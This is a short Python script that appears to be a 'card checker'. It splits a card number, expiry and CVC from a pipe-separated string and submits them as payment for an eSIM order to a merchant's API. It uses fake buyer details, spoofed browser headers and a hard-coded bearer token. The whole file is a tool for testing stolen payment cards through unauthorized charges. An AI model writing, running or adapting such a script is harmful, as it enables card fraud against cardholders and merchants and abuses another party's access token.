def check(ccx):
  import requests
  from fake_useragent import UserAgent
  import json
  import re
  
  ccx=ccx.strip()
  n = ccx.split("|")[0]
  mm = ccx.split("|")[1]
  yy = ccx.split("|")[2]
  cvc = ccx.split("|")[3]
  if "20" in yy:#Mo3gza
    yy = yy.split("20")[1]
  r = requests.session()
  ua = UserAgent()
  user_agent = ua.random

  url = "https://apiv2.sooesim.com/v1/order/create.php"

  payload = {
  "package_code": "CKH278",
  "country_code": "SA",
  "max_renewals": 1,
  "quantity": 1,
  "payment": {
    "name": "ali mohmed",
    "email": "gamer@gmail.com",
    "phone": "5151112230",
    "cardNumber": n,
    "expireMonth": mm,
    "expireYear": yy,
    "cvc": cvc
  }
}

  headers = {
  'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
  'Content-Type': "application/json",
  'authorization': "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzb29lc2ltX2FwaSIsInN1YiI6MTIzLCJuYW1lIjoiYWxpIHNocyIsInVzZXJuYW1lIjoiYWxpX3NocyIsImVtYWlsIjoiZ2FtZXJhYmRhbGxhZ0BnbWFpbC5jb20iLCJpYXQiOjE3NDkwNzkyODEsImV4cCI6MTc0OTA4Mjg4MX0.rQF-HoAPzJZ_DavYo2BhlaZdJlxDwEVFQGSkG-98c_E",
  'sec-fetch-site': "same-site",
  'accept-language': "en-US,en;q=0.9",
  'sec-fetch-mode': "cors",
  'origin': "https://sooesim.com",
  'referer': "https://sooesim.com/",
  'sec-fetch-dest': "empty"
}

  r2 = requests.post(url, data=json.dumps(payload), headers=headers)

  return r2.text
